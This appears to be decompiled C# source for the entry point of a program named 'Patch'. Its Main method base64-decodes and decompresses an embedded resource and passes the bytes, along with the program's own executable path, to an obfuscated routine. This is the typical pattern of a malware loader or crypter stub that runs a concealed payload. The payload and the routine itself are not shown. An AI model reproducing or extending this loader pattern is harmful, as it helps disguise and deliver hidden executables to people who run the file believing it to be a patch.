using System;
using System.Windows.Forms;
using Patch.Properties;

namespace Patch;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		byte[] bytes = Decompressed.Decompress(Convert.FromBase64String(Resources.String1));
		GClass0.smethod_1(bytes, Application.get_ExecutablePath());
	}
}
